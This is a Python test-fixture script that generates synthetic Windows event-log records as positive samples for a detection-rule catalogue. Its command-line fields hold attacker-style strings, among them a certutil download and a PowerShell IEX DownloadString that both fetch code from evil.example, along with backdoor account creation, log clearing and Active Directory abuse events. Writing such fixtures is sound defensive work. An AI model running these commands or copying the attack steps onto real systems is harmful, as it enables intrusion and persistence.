"""
Positive samples for every bundled Windows rule, written as real EVTX
EventData / UserData and pushed through the parser's flatten() so the field
mapping is validated too. Used by tests/backend/test_rule_catalogue.py and,
exported as JSON, by the frontend engine tests.

    .venv\\Scripts\\python.exe samples\\synthetic\\rule_samples.py   # writes frontend/src/rules/rule_samples.json
"""

from __future__ import annotations

import json
import sys
from pathlib import Path
from typing import Any

sys.path.insert(0, "backend")
from services.parsers.evtx_parser import flatten  # noqa: E402

SEC = ("Microsoft-Windows-Security-Auditing", "Security")
SYSMON = ("Microsoft-Windows-Sysmon", "Microsoft-Windows-Sysmon/Operational")
PS = ("Microsoft-Windows-PowerShell", "Microsoft-Windows-PowerShell/Operational")
SCM = ("Service Control Manager", "System")
MSSQL = ("MSSQL$PROD", "Application")
SSHD = ("OpenSSH", "OpenSSH/Operational")
KDC = ("Microsoft-Windows-Kerberos-Key-Distribution-Center", "System")
DNS_AUDIT = ("Microsoft-Windows-DNSServer", "Microsoft-Windows-DNSServer/Audit")
BITLOCKER = ("Microsoft-Windows-BitLocker-API", "Microsoft-Windows-BitLocker/BitLocker Management")
# reference times (UTC). Business hours in the tests: 08-19 Europe/Paris, weekend Sat/Sun.
DAY = 1788300000000  # 2026-09-01 (Tuesday) 21:20 UTC
T_WORK = 1788255000000  # 2026-09-01 08:50 UTC = 10:50 Paris
T_NIGHT = 1788226200000  # 2026-09-01 00:50 UTC = 02:50 Paris
T_SUNDAY = 1788080000000  # 2026-08-30 (Sunday) 08:13 UTC
_rec = [1000]


def ev(
    event_id: int, prov: tuple[str, str], data: dict[str, Any], ts: int = T_WORK, computer: str = "WS01", user_data: dict[str, Any] | None = None
) -> dict[str, Any]:
    _rec[0] += 1
    iso = (
        __import__("datetime")
        .datetime.fromtimestamp(ts / 1000, tz=__import__("datetime").timezone.utc)
        .isoformat(timespec="microseconds")
        .replace("+00:00", "Z")
    )
    event: dict[str, Any] = {
        "Event": {
            "System": {
                "Provider": {"#attributes": {"Name": prov[0], "Guid": "{54849625-5478-4994-A5BA-3E3B0328C30D}"}},
                "EventID": event_id,
                "Version": 2,
                "Level": 0,
                "Task": 0,
                "Opcode": 0,
                "Keywords": "0x8020000000000000",
                "TimeCreated": {"#attributes": {"SystemTime": iso}},
                "EventRecordID": _rec[0],
                "Execution": {"#attributes": {"ProcessID": 720, "ThreadID": 1}},
                "Channel": prov[1],
                "Computer": computer,
                "Security": {"#attributes": {"UserID": "S-1-5-18"}},
            },
        }
    }
    if user_data is not None:
        event["Event"]["UserData"] = user_data
    else:
        event["Event"]["EventData"] = data
    return flatten(event, None, include_raw=True)


def logon_fail(ip: str, user: str, ts: int, sub: str = "0xc000006a", lt: int = 3) -> dict[str, Any]:
    return ev(
        4625,
        SEC,
        {
            "SubjectUserSid": "S-1-0-0",
            "SubjectUserName": "-",
            "TargetUserName": user,
            "TargetDomainName": "CORP",
            "Status": "0xc000006d",
            "SubStatus": sub,
            "LogonType": lt,
            "IpAddress": ip,
            "IpPort": 4444,
            "WorkstationName": "KALI",
            "AuthenticationPackageName": "NTLM",
        },
        ts,
    )


def logon_ok(ip: str, user: str, ts: int, lt: int = 3, auth: str = "Kerberos", extra: dict[str, Any] | None = None) -> dict[str, Any]:
    d = {
        "TargetUserName": user,
        "TargetDomainName": "CORP",
        "TargetLogonId": "0x3e7",
        "LogonType": lt,
        "IpAddress": ip,
        "IpPort": 50000,
        "WorkstationName": "WS02",
        "AuthenticationPackageName": auth,
        "LogonProcessName": "Kerberos" if auth == "Kerberos" else "NtLmSsp",
        "KeyLength": 128,
        "SubjectUserName": "-",
        "ElevatedToken": "%%1843",
    }
    d.update(extra or {})
    return ev(4624, SEC, d, ts)


def proc(image: str, cmd: str, parent: str = "C:\\Windows\\explorer.exe", user: str = "alice", ts: int = T_WORK) -> dict[str, Any]:
    return ev(
        4688,
        SEC,
        {
            "SubjectUserName": user,
            "SubjectDomainName": "CORP",
            "NewProcessName": image,
            "NewProcessId": "0x1234",
            "CommandLine": cmd,
            "ParentProcessName": parent,
            "TokenElevationType": "%%1938",
            "MandatoryLabel": "S-1-16-8192",
        },
        ts,
    )


def sysmon(event_id: int, data: dict[str, Any], ts: int = T_WORK) -> dict[str, Any]:
    base = {
        "UtcTime": "2026-09-01 08:50:00.000",
        "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
        "ProcessId": 4321,
        "User": "CORP\\alice",
        "RuleName": "-",
    }
    base.update(data)
    return ev(event_id, SYSMON, base, ts)


def sql_audit(action: str, klass: str, fields: dict[str, str], ts: int) -> dict[str, Any]:
    """A SQL Server audit record (33205): the whole record as name:value lines in one string."""
    record = {"audit_schema_version": "1", "action_id": action, "succeeded": "true", "class_type": klass, "server_principal_name": "CORP\\dba1"}
    record.update(fields)
    return ev(33205, MSSQL, {"Data": "\n".join(f"{k}:{v}" for k, v in record.items())}, ts, computer="SQL01")


def build() -> list[dict[str, Any]]:
    """A small host scenario touching most bundled Windows rules: a brute force that succeeds, an
    off-hours admin logon, a weekend service-account logon, download and execution tooling, a
    Sysmon process / network / DNS / file chain, a log clear, a service install, account and group
    changes and an encoded PowerShell script block. Also the event half of the engine parity fixture."""
    t = T_WORK
    rows: list[dict[str, Any]] = []
    for i in range(12):
        rows.append(logon_fail("203.0.113.9", "alice", t + i * 5000))
    rows.append(logon_ok("203.0.113.9", "alice", t + 70_000, lt=10))
    rows.append(logon_ok("198.51.100.7", "administrator", T_NIGHT, lt=10, auth="NTLM"))
    rows.append(logon_ok("10.0.0.5", "svc_backup", T_SUNDAY, lt=3))
    rows.append(
        proc(
            r"C:\Windows\System32\certutil.exe",
            "certutil.exe -urlcache -split -f http://evil.example/a.exe C:\\Users\\Public\\a.exe",
            parent=r"C:\Windows\System32\cmd.exe",
            ts=t + 90_000,
        )
    )
    rows.append(
        proc(
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell -nop -w hidden -enc SQBFAFgA",
            parent=r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
            ts=t + 95_000,
        )
    )
    rows.append(proc(r"C:\Windows\notepad.exe", "notepad.exe", ts=t + 96_000))
    rows.append(
        sysmon(
            1,
            {
                "Image": r"C:\Windows\System32\rundll32.exe",
                "CommandLine": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"',
                "ParentImage": r"C:\Windows\System32\cmd.exe",
                "OriginalFileName": "RUNDLL32.EXE",
            },
            ts=t + 100_000,
        )
    )
    rows.append(
        sysmon(
            3,
            {"Image": r"C:\Windows\System32\rundll32.exe", "DestinationIp": "203.0.113.66", "DestinationPort": 4444, "Protocol": "tcp", "Initiated": "true"},
            ts=t + 101_000,
        )
    )
    rows.append(
        sysmon(22, {"Image": r"C:\Windows\System32\rundll32.exe", "QueryName": "evil-login.net", "QueryResults": "::ffff:203.0.113.66;"}, ts=t + 102_000)
    )
    rows.append(sysmon(11, {"Image": r"C:\Windows\explorer.exe", "TargetFilename": r"C:\Users\alice\Downloads\invoice.pdf.exe"}, ts=t + 103_000))
    rows.append(
        ev(
            1102,
            ("Microsoft-Windows-Eventlog", "Security"),
            {},
            ts=t + 110_000,
            user_data={"LogFileCleared": {"SubjectUserName": "alice", "SubjectDomainName": "CORP"}},
        )
    )
    rows.append(
        ev(
            7045,
            SCM,
            {
                "ServiceName": "Updater",
                "ImagePath": r"C:\Users\Public\svc.exe",
                "ServiceType": "user mode service",
                "StartType": "auto start",
                "AccountName": "LocalSystem",
            },
            ts=t + 120_000,
        )
    )
    rows.append(ev(4720, SEC, {"TargetUserName": "backdoor", "SubjectUserName": "alice", "SubjectDomainName": "CORP"}, ts=t + 130_000))
    rows.append(ev(4732, SEC, {"MemberName": "CN=backdoor,CN=Users,DC=corp", "TargetUserName": "Administrators", "SubjectUserName": "alice"}, ts=t + 131_000))
    # directory changes, as a domain controller logs them
    dc = "DC01"
    adm = {"SubjectUserName": "alice", "SubjectDomainName": "CORP", "SubjectUserSid": "S-1-5-21-1-2-3-1104"}
    uac = {"TargetUserName": "roastme", "TargetSid": "S-1-5-21-1-2-3-1201", "AllowedToDelegateTo": "-", **adm}
    rows.append(ev(4738, SEC, {**uac, "UserAccountControl": "%%2096"}, ts=t + 132_000, computer=dc))
    rows.append(ev(4738, SEC, {**uac, "UserAccountControl": "%%2089"}, ts=t + 132_500, computer=dc))
    rows.append(ev(4742, SEC, {**uac, "TargetUserName": "WS09$", "UserAccountControl": "%%2093"}, ts=t + 133_000, computer=dc))
    ds = {"OpCorrelationID": "{1}", "AttributeSyntaxOID": "2.5.5.12", "OperationType": "%%14674", **adm}
    rows.append(
        ev(
            5136,
            SEC,
            {
                **ds,
                "ObjectDN": "CN=FS01,OU=Servers,DC=corp,DC=local",
                "ObjectClass": "computer",
                "AttributeLDAPDisplayName": "msDS-AllowedToActOnBehalfOfOtherIdentity",
                "AttributeValue": "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1-2-3-1301)",
            },
            ts=t + 133_500,
            computer=dc,
        )
    )
    rows.append(
        ev(
            5136,
            SEC,
            {
                **ds,
                "ObjectDN": "DC=corp,DC=local",
                "ObjectClass": "domainDNS",
                "AttributeLDAPDisplayName": "nTSecurityDescriptor",
                "AttributeValue": "O:DAG:DAD:(A;;CR;;;S-1-5-21-1-2-3-1201)",
            },
            ts=t + 134_000,
            computer=dc,
        )
    )
    rows.append(
        ev(
            5136,
            SEC,
            {
                **ds,
                "ObjectDN": "OU=Servers,DC=corp,DC=local",
                "ObjectClass": "organizationalUnit",
                "AttributeLDAPDisplayName": "nTSecurityDescriptor",
                "AttributeValue": "O:DAG:DAD:(A;;GA;;;S-1-5-21-1-2-3-1201)",
            },
            ts=t + 134_500,
            computer=dc,
        )
    )
    rows.append(
        ev(
            5136,
            SEC,
            {
                **ds,
                "ObjectDN": "CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=corp,DC=local",
                "ObjectClass": "controlAccessRight",
                "AttributeLDAPDisplayName": "localizationDisplayId",
                "AttributeValue": "42",
            },
            ts=t + 135_000,
            computer=dc,
        )
    )
    rows.append(
        ev(
            5137,
            SEC,
            {**ds, "ObjectDN": "CN=WS09,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=local", "ObjectClass": "server"},
            ts=t + 135_500,
            computer=dc,
        )
    )
    rows.append(ev(4739, SEC, {**adm, "DomainPolicyChanged": "Lockout Policy", "LockoutThreshold": "0"}, ts=t + 136_000, computer=dc))
    rows.append(ev(4908, SEC, {**adm, "SidList": "-"}, ts=t + 136_500, computer=dc))
    rows.append(ev(4704, SEC, {**adm, "TargetSid": "S-1-5-21-1-2-3-1201", "PrivilegeList": "SeDebugPrivilege"}, ts=t + 137_000, computer=dc))
    rows.append(ev(4722, SEC, {**adm, "TargetUserName": "Guest", "TargetSid": "S-1-5-21-1-2-3-501"}, ts=t + 137_500))
    # server products: SQL Server, OpenSSH, Certificate Services, the DNS server, BitLocker
    sq = t + 150_000
    rows.append(
        sql_audit(
            "APRL",
            "SG",
            {"target_server_principal_name": "backdoor", "object_name": "sysadmin", "statement": "ALTER SERVER ROLE [sysadmin] ADD MEMBER [backdoor]"},
            sq,
        )
    )
    rows.append(
        sql_audit(
            "APRL",
            "RL",
            {"target_database_principal_name": "backdoor", "object_name": "db_owner", "statement": "ALTER ROLE [db_owner] ADD MEMBER [backdoor]"},
            sq + 1000,
        )
    )
    rows.append(sql_audit("CR", "SL", {"object_name": "backdoor", "statement": "CREATE LOGIN [backdoor] WITH PASSWORD=N'******'"}, sq + 2000))
    rows.append(sql_audit("LGEA", "SL", {"object_name": "sa", "statement": "ALTER LOGIN [sa] ENABLE"}, sq + 3000))
    rows.append(sql_audit("DR", "SA", {"object_name": "server-audit-spec", "statement": "DROP SERVER AUDIT SPECIFICATION [server-audit-spec]"}, sq + 4000))
    for i, login in enumerate(["sa", "admin", "sa", "root", "sa"]):
        reason = f"Login failed for user '{login}'. Reason: Password did not match that for the login provided. [CLIENT: 203.0.113.12]"
        info = "<action_info><address>203.0.113.12</address></action_info>"
        rows.append(
            sql_audit(
                "LGIF",
                "LX",
                {"succeeded": "false", "server_principal_name": login, "statement": reason, "additional_information": info},
                sq + 10_000 + i * 2000,
            )
        )
    rows.append(ev(15457, MSSQL, {"Data": ["xp_cmdshell", "0", "1"]}, sq + 30_000, computer="SQL01"))
    rows.append(ev(17115, MSSQL, {"Data": '\r\n\t -s "PROD"\r\n\t -m'}, sq + 31_000, computer="SQL01"))
    for i in range(5):
        rows.append(
            ev(4, SSHD, {"process": "sshd", "payload": f"Invalid user user{i} from 203.0.113.13 port {50000 + i}"}, sq + 40_000 + i * 1000, computer="FS01")
        )
    ca = {"SubjectUserSid": "S-1-5-21-1-2-3-1104", "SubjectUserName": "alice", "SubjectDomainName": "CORP", "SubjectLogonId": "0x3e7"}
    attrs = "CertificateTemplate:ESC1_User\nSAN:upn=administrator@corp.local"
    rows.append(
        ev(4886, SEC, {"RequestId": "12", "Requester": "CORP\\alice", "Attributes": attrs, "CertificateTemplate": "ESC1_User"}, sq + 50_000, computer="PKI01")
    )
    rows.append(ev(4882, SEC, {**ca, "SecuritySettings": "Allow(0x00000003)\tCORP\\alice\n\tCA Administrator"}, sq + 51_000, computer="PKI01"))
    rows.append(ev(4899, SEC, {**ca, "TemplateInternalName": "ESC1_User"}, sq + 52_000, computer="PKI01"))
    rows.append(ev(4885, SEC, {**ca, "AuditFilter": "0"}, sq + 53_000, computer="PKI01"))
    rows.append(ev(4876, SEC, {**ca, "BackupType": "1"}, sq + 54_000, computer="PKI01"))
    rows.append(ev(39, KDC, {"AccountName": "administrator", "Subject": "CN=alice", "Issuer": "corp-ca"}, sq + 55_000, computer="DC01"))
    rows.append(
        ev(541, DNS_AUDIT, {"Setting": "ServerLevelPluginDll", "Scope": ".", "NewValue": "\\\\203.0.113.14\\share\\p.dll"}, sq + 56_000, computer="DC01")
    )
    rows.append(ev(541, DNS_AUDIT, {"Setting": "EventLogLevel", "Scope": ".", "NewValue": "0"}, sq + 57_000, computer="DC01"))
    rows.append(ev(515, DNS_AUDIT, {"Type": 1, "NAME": "*.corp.local", "TTL": 3600, "Zone": "corp.local"}, sq + 58_000, computer="DC01"))
    bl = {"VolumeName": "\\\\?\\Volume{1}", "VolumeMountPoint": "C:"}
    rows.append(ev(775, BITLOCKER, {**bl, "ProtectorType": "0x8"}, sq + 60_000))
    rows.append(ev(768, BITLOCKER, {**bl, "AlgorithmType": 32772}, sq + 61_000))
    rows.append(ev(4104, PS, {"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/p.ps1')", "Path": ""}, ts=t + 140_000))
    return rows


if __name__ == "__main__":
    out = Path("frontend/src/rules/rule_samples.json")
    out.write_text(json.dumps(build(), default=str), encoding="utf-8")
    print(f"{len(build())} sample events written to {out}")
